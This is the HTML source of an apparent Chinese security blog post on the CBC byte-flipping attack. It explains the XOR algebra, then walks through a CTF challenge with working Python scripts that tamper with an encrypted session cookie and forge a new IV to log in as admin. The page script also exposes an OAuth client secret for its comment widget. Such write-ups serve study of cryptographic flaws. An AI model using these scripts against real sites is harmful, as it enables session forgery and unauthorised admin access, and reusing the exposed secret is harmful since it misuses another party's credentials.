@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      CBC字节翻转攻击 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>CBC字节翻转攻击</h2>
+  <p class="post-date">2019-03-16 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="分组密码工作模式"><a href="#分组密码工作模式" class="headerlink" title="分组密码工作模式"></a>分组密码工作模式</h1><p><a href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F" target="_blank" rel="noopener">分组密码工作模式</a></p>
+<blockquote>
+<blockquote>
+<p>密码学中，分组（block）密码的工作模式（mode of operation）允许使用同一个分组密码密钥对多于一块的数据进行加密，并保证其安全性。[1][2] 分组密码自身只能加密长度等于密码分组长度的单块数据，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到匹配密码块大小的长度。一种工作模式描述了加密每一数据块的过程，并常常使用基于一个通常称为初始化向量的附加输入值以进行随机化，以保证安全[1]。</p>
+</blockquote>
+</blockquote>
+<p><strong>这段话说的意思是对明文进行分块，分成相同字节的块数据。先使用等长字节数初始向量进行加密对第一块明文，之后的每一明文块都使用想同长度的密文块对明文块进行加密。所以可知密文和明文的每一个字节是一一对应的。解密也是如此，字节数相同的明文块和密文块进行解密。</strong></p>
+<h1 id="密码块链接（CBC）"><a href="#密码块链接（CBC）" class="headerlink" title="密码块链接（CBC）"></a>密码块链接（CBC）</h1><h2 id="加密过程："><a href="#加密过程：" class="headerlink" title="加密过程："></a>加密过程：</h2><p><strong>Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块</strong><br><strong>Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块</strong><br><img src="./1.jpg" alt=""></p>
+<p><strong>Plaintext</strong>：待加密的数据。<br><strong>IV</strong>：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。<br><strong>Key</strong>：被一些如AES的对称加密算法使用。<br><strong>Ciphertext</strong>：加密后的数据。</p>
+<h2 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h2><p><strong>Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</strong><br><strong>Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</strong><br><img src="./2.jpg" alt=""></p>
+<h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><p><strong>Ciphertext-N-1（密文-N-1)</strong>是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方<br>如果我们改变<strong>Ciphertext-N-1（密文-N-1）</strong>的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！<br><img src="./3.jpg" alt=""></p>
+<h1 id="攻击过程详解"><a href="#攻击过程详解" class="headerlink" title="攻击过程详解"></a>攻击过程详解</h1><p>先看解密过程<br><img src="./4.jpg" alt=""></p>
+<p><strong>Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</strong><br><strong>Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</strong><br>即<br>*<em>明文= Descrypt(本组密文) ^ 上组密文 *</em></p>
+<p><code>C    =    A        ^                B</code></p>
+<h2 id="通俗公式推导"><a href="#通俗公式推导" class="headerlink" title="通俗公式推导"></a>通俗公式推导</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数学公式异或关系表达式如下</span><br><span class="line">A ^ A &#x3D;0 , B^ B &#x3D;0 , 0^ 0 &#x3D;0 , 0 ^ 任一字符&#x3D; 任一字符</span><br><span class="line">可得 A ^ B ^ C&#x3D;A^ B ^ A ^ B &#x3D; 0</span><br><span class="line"></span><br><span class="line">综合所述CBC字节翻转公式：</span><br><span class="line">A ^ B ^ C &#x3D;0  &#x3D;&gt;   A ^ B ^ C ^ &quot; 想要字符&quot;&#x3D;A ^ B ^A ^ B ^ &quot;想要字符&quot;  &#x3D;  0 ^ “想要字符” &#x3D;   “想要字符”</span><br><span class="line">通俗讲：想要字符 &#x3D; 本组密文(A) ^  上组密文(B) ^ 本组明文字节(C) ## 本组密文，上组密文对应位置该字符</span><br></pre></td></tr></table></figure>
+
+<p>借用<a href="http://drops.xmd5.com/static/drops/tips-7828.html" target="_blank" rel="noopener">CBC字节翻转攻击-101Approach</a> 中PHP脚本中演示翻转结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$v &#x3D; &quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;&#125;&quot;;</span><br><span class="line">$enc &#x3D; @encrypt($v);</span><br><span class="line">$enc[2] &#x3D; chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));</span><br><span class="line">$b &#x3D; @decrypt($enc);</span><br></pre></td></tr></table></figure>
+<p><img src="./5.jpg" alt=""><br><strong><em>可以看到 6 被翻转为 7</em></strong></p>
+<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p><img src="./6.png" alt=""></p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>通读全篇代码并未对<code>password</code>进行验证，而是关注于<code>username</code>验证。<br>用户在登录界面输入<code>username</code> 和 <code>password</code>。先进入第<strong>76</strong>行进行验证，如果是以<code>admin</code>进行登入则会显示登录失败。<br>在第<strong>63</strong>行，拿到flag需要使用admin进行登入，所以这里与第<strong>76</strong>行代码产生矛盾。<br>如果我们使用<code>cookie session</code>进行登入，程序会进入第<strong>84</strong>行，会执行两个方法<code>check_login()</code>和<code>show_homepage()</code>。 <code>show_homepage()</code>是我们拿到flag的方法入口。而在<code>check_login()</code>，通过解密在<code>$_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];</code> 下会对<code>username</code>重新赋值.<br>所以我们的方法是使用<strong>cbc字节翻转</strong>对<code>cipher</code>中的登入账户的某个字节进行翻转得到<code>&quot;admin&quot;</code></p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>根据我们上述的方法，编写python代码得到新的cipher  ， new_cipher</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">offset&#x3D;0</span><br><span class="line">cipher&#x3D;&#39;JYMQwKhTEMlRtwFGwuLz36oSosohsx%2BM50msZbWxWNHttjPFQuMGIfVpEEZpZt9aZvxSeohC7XfVmi78v8oyVw%3D%3D&#39;</span><br><span class="line">cipher&#x3D;base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">serialize_info&#x3D;&#39;a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;bdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125;&#39;</span><br><span class="line">serialize_info1&#x3D;serialize_info[0:16]</span><br><span class="line">serialize_info2&#x3D;serialize_info[16:32]</span><br><span class="line">serialize_info3&#x3D;serialize_info[32:]</span><br><span class="line">array_seria&#x3D;[serialize_info1,serialize_info2,serialize_info3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(0,len(array_seria[1])):</span><br><span class="line">	if array_seria[1][i]&#x3D;&#x3D;&#39;b&#39; in array_seria[1]:</span><br><span class="line">		print(str(array_seria[1][i])+&#39; index is:&#39;+str(i))</span><br><span class="line">		offset&#x3D;i</span><br><span class="line"></span><br><span class="line">new_cipher &#x3D; cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;b&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]</span><br><span class="line">print(&#39;new_cipher :  &#39;+urllib.quote_plus(base64.b64encode(new_cipher)))</span><br></pre></td></tr></table></figure>
+<p><img src="./7.png" alt=""></p>
+<p>放入<code>burpsuite</code>中替换<code>cipher</code><br><img src="./8.png" alt=""></p>
+<p>提示反序列化失败，对返回的<code>base64</code>代码进行解码<br><img src="./9.png" alt=""></p>
+<h1 id="解决首字块乱码"><a href="#解决首字块乱码" class="headerlink" title="解决首字块乱码"></a>解决首字块乱码</h1><p>发现前16个字节块反序列化失败，所以这里可以知道cbc加密是分16字节每块进行加密。<br><strong>因为第一块明文加密是使用iv初始向量进行加密，而用于一同解密的密文被我们改变,造成解密出现不可预知的乱码。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根据第一块解密公式</span><br><span class="line">Plaintext-0 &#x3D; Decrypt(Ciphertext) XOR IV</span><br><span class="line">可得新向量</span><br><span class="line">new_iv &#x3D; Plaintext-0 ^ Decrypt(Ciphertext)</span><br><span class="line">新的初始向量 &#x3D; 十六字节明文 ^ Decrypt(前十六字节密文new_cipher)</span><br></pre></td></tr></table></figure>
+
+<p>编写<code>python</code>代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new_iv&#x3D;&#39;&#39;</span><br><span class="line">for j in range(0,16):</span><br><span class="line">	 new_iv&#x3D;new_iv+chr(ord(iv[j]) ^ ord(res[j]) ^ ord(array_seria[0][j]))</span><br><span class="line"></span><br><span class="line">new_iv&#x3D;urllib.quote(base64.b64encode(new_iv))</span><br><span class="line">print(&#39;new_iv: &#39;+new_iv)</span><br></pre></td></tr></table></figure>
+<p><img src="./10.png" alt=""></p>
+<p>将新<code>iv,cipher</code> 替换旧<code>iv , cipher</code>可得flag</p>
+<p><img src="./11.png" alt=""></p>
+<h1 id="解题python代码"><a href="#解题python代码" class="headerlink" title="解题python代码"></a>解题python代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">offset&#x3D;0</span><br><span class="line">cipher&#x3D;&#39;JYMQwKhTEMlRtwFGwuLz36oSosohsx%2BM50msZbWxWNHttjPFQuMGIfVpEEZpZt9aZvxSeohC7XfVmi78v8oyVw%3D%3D&#39;</span><br><span class="line">cipher&#x3D;base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">serialize_info&#x3D;&#39;a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;bdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125;&#39;</span><br><span class="line">serialize_info1&#x3D;serialize_info[0:16]</span><br><span class="line">serialize_info2&#x3D;serialize_info[16:32]</span><br><span class="line">serialize_info3&#x3D;serialize_info[32:]</span><br><span class="line">array_seria&#x3D;[serialize_info1,serialize_info2,serialize_info3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(0,len(array_seria[1])):</span><br><span class="line">	if array_seria[1][i]&#x3D;&#x3D;&#39;b&#39; in array_seria[1]:</span><br><span class="line">		print(str(array_seria[1][i])+&#39; index is:&#39;+str(i))</span><br><span class="line">		offset&#x3D;i</span><br><span class="line"></span><br><span class="line">new_cipher &#x3D; cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;b&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]</span><br><span class="line">print(&#39;new_cipher :  &#39;+urllib.quote_plus(base64.b64encode(new_cipher)))</span><br><span class="line">res &#x3D; base64.b64decode(&#39;X2+7PVoBz5Fx&#x2F;1OCajQkHm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ&#x3D;&#x3D;&#39;);	</span><br><span class="line">iv &#x3D; base64.b64decode(urllib.unquote(&#39;OVvKyLSujW%2BwWSroAUNNaw%3D%3D&#39;)); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_iv&#x3D;&#39;&#39;</span><br><span class="line">for j in range(0,16):</span><br><span class="line">	 new_iv&#x3D;new_iv+chr(ord(iv[j]) ^ ord(res[j]) ^ ord(array_seria[0][j]))</span><br><span class="line"></span><br><span class="line">new_iv&#x3D;urllib.quote(base64.b64encode(new_iv))</span><br><span class="line">print(&#39;new_iv: &#39;+new_iv)</span><br></pre></td></tr></table></figure>
+
+<h1 id="mochazz学长的python代码"><a href="#mochazz学长的python代码" class="headerlink" title="mochazz学长的python代码"></a>mochazz学长的python代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import urllib,base64,requests,re</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;*.*.*.*&#x2F;index.php&quot;</span><br><span class="line">datas &#x3D; &#123;</span><br><span class="line">	&quot;username&quot; : &quot;Admin&quot;,</span><br><span class="line">	&quot;password&quot; : &quot;admin&quot;</span><br><span class="line">&#125;</span><br><span class="line">r &#x3D; requests.post(url,data&#x3D;datas)</span><br><span class="line">cipher &#x3D; r.cookies.get(&quot;cipher&quot;)</span><br><span class="line">cipher &#x3D; base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">offset &#x3D; 9</span><br><span class="line">new_cipher &#x3D; cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]</span><br><span class="line">new_cookies &#x3D; requests.utils.dict_from_cookiejar(r.cookies)</span><br><span class="line">new_cookies[&quot;cipher&quot;] &#x3D; urllib.quote_plus(base64.b64encode(new_cipher))</span><br><span class="line">r2 &#x3D; requests.get(url,cookies&#x3D;new_cookies)</span><br><span class="line">plain &#x3D; base64.b64decode(re.findall(&quot;decode\(&#39;(.*)&#39;\)&quot;,r2.text)[0])</span><br><span class="line">iv &#x3D; base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))</span><br><span class="line">old &#x3D; plain[:len(iv)]</span><br><span class="line">new &#x3D; &#39;a:2:&#123;s:8:&quot;userna&#39;</span><br><span class="line">new_iv &#x3D; &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])</span><br><span class="line">new_cookies[&quot;iv&quot;] &#x3D; urllib.quote_plus(base64.b64encode(new_iv))</span><br><span class="line">r3 &#x3D; requests.get(url,cookies&#x3D;new_cookies)</span><br><span class="line">print(r3.text)</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mochazz.github.io/2018/05/06/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">CBC字节翻转攻击mochazz</a></p>
+<p><a href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F#%E5%AF%86%E7%A0%81%E5%9D%97%E9%93%BE%E6%8E%A5%EF%BC%88CBC%EF%BC%89" target="_blank" rel="noopener">分组密码工作模式CBC</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-7828.html" target="_blank" rel="noopener">CBC字节翻转攻击-101Approach</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#WEB安全" >
+    <span class="tag-code">WEB安全</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/03/14/sql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">
+        <span class="nav-arrow">← </span>
+        
+          sql注入备忘录
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/03/17/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E5%85%B6%E8%A7%84%E9%81%BF%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0/">
+        
+          浏览器同源策略及其规避方法笔记
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#分组密码工作模式"><span class="toc-nav-text">分组密码工作模式</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#密码块链接（CBC）"><span class="toc-nav-text">密码块链接（CBC）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#加密过程："><span class="toc-nav-text">加密过程：</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#解密过程"><span class="toc-nav-text">解密过程</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#攻击过程"><span class="toc-nav-text">攻击过程</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#攻击过程详解"><span class="toc-nav-text">攻击过程详解</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#通俗公式推导"><span class="toc-nav-text">通俗公式推导</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CTF"><span class="toc-nav-text">CTF</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#代码分析"><span class="toc-nav-text">代码分析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#解题过程"><span class="toc-nav-text">解题过程</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#解决首字块乱码"><span class="toc-nav-text">解决首字块乱码</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#解题python代码"><span class="toc-nav-text">解题python代码</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#mochazz学长的python代码"><span class="toc-nav-text">mochazz学长的python代码</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/03/16/CBC字节翻转攻击/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "CBC字节翻转攻击",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
